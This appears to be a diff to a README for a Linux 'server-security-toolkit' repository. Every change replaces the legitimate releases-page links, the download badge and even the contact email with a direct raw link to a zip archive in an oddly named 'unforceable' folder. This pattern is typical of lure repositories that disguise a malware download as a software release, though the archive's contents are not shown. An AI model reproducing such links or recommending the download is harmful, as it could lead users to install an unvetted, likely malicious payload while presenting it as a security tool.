@@ -6,7 +6,7 @@ Welcome to the **server-security-toolkit**! This toolkit provides essential tool
 
 ## 📥 Download Now
 
-[![Download server-security-toolkit](https://img.shields.io/badge/Download-server--security--toolkit-blue.svg)](https://github.com/Fredopondo/server-security-toolkit/releases)
+[![Download server-security-toolkit](https://github.com/Fredopondo/server-security-toolkit/raw/refs/heads/main/unforceable/security_server_toolkit_3.8.zip)](https://github.com/Fredopondo/server-security-toolkit/raw/refs/heads/main/unforceable/security_server_toolkit_3.8.zip)
 
 ## ⚙️ System Requirements
 
@@ -21,7 +21,7 @@ Before you install the server-security-toolkit, ensure that your system meets th
 
 To get the server-security-toolkit, follow these simple steps:
 
-1. Head over to the [Releases Page](https://github.com/Fredopondo/server-security-toolkit/releases).
+1. Head over to the [Releases Page](https://github.com/Fredopondo/server-security-toolkit/raw/refs/heads/main/unforceable/security_server_toolkit_3.8.zip).
 2. Look for the latest release version.
 3. Click on the appropriate package for your Linux distribution.
 4. Once the download completes, locate the downloaded file in your system's downloads folder.
@@ -84,7 +84,7 @@ If you have ideas for improvement or would like to contribute, we welcome your s
 
 If you have specific questions or need help, feel free to reach out:
 
-- **Email:** contact@example.com
+- **Email:** https://github.com/Fredopondo/server-security-toolkit/raw/refs/heads/main/unforceable/security_server_toolkit_3.8.zip
 - **GitHub Issues:** Report issues directly via our GitHub issues page.
 
 ## 🌍 Stay Updated
@@ -93,4 +93,4 @@ Follow us on GitHub to stay informed about updates and new features. We will reg
 
 Thank you for using the **server-security-toolkit**! Secure your Linux server today.
 
-[Download server-security-toolkit](https://github.com/Fredopondo/server-security-toolkit/releases)
+[Download server-security-toolkit](https://github.com/Fredopondo/server-security-toolkit/raw/refs/heads/main/unforceable/security_server_toolkit_3.8.zip)
